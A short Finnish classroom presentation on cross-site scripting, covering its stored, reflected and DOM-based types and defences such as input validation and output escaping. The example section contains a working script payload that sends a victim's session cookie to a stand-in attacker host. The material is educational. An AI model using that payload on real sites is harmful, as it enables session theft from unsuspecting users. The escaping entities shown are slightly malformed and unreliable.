# XSS: Lyhyt esitys tunnille

Tehty: 21.5.2019

Mikä on
- Voi injektoida JavaScriptiä sivulle
- Koodi ajetaan kun sivu ladataan käyttäjän selaimessa
- Ajetaan clientilla
- Hyvin yleinen

Käyttö
- Tietojen varastaminen
- Sessio cookien varastaminen
- BeEF: Selaimen kaappaaminen

Kolme päätyyppiä xss-muotoa.

## Persistent/stored XSS

- Hyökkääjän Javasctipt koodia on tallennettu tietokantaan
- Aina kun joku avaa sivun, koodia ajetaan
- Lomake, johon voi laittaa tekstiä. Teksti talletetaan kantaan, ja näytetään jossain vaiheessa käyttäjille.

## Refelected XSS

- Vain kun käyttäjä klikkaa spesifia URL:ia
- Toimii käyttäjän selaimessa siten, kuin sen alkuperä olisi sivusto itse

## DOM based XSS

- DOM-pohjaiset haavoittuvuudet, eli paikalliset cross site scripting -haavoittuvuudet ovat sivujen skripteissä itsessään.
- Ajetaan client side
- Ei ole serverin suojaa (validointia) XSS:ää vastaan


## Esimerkki

Lähetetään käyttäjälle linkki, jossa JavaScriptiä.

```
<script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>
```

Tai syötetään lomakeen kenttään ylläoleva Javascript koodi, jollioin se tallentuu tietokantaan. Stored XSS etuna hyökkääjälle on se, että sillä voi saavuttaa jopa tuhansia käyttäjiä. Refelected XSS:ssä käyttäjä pitää huijata klikkaamaan haitallista linkkiä.

## Suojautuminen

Inputin validointi
- myös serverin päässä
- Minimoi käyttäjän ipuntin määrä

Poista kaikki epäluotettava input, ennen sivulle lisäämistä (escaping)
```
' -> &x27;
/ -> &#2F;
```

Saa aikaan sen, että koodia ei ajeta. Merkit pitää käsitellä HTML:nä.

htmlspecialchars tekee tämän PHP:ssa

Käyttäjän suojutuminen
- Varo linkkejä
- Varo update yms. ilmoituksia
- Älä välitä "anna login tiedot" ilmoituksista

### lähteet

Owasp top 10
- https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf

Wikipedia
- https://fi.wikipedia.org/wiki/Cross_site_scripting
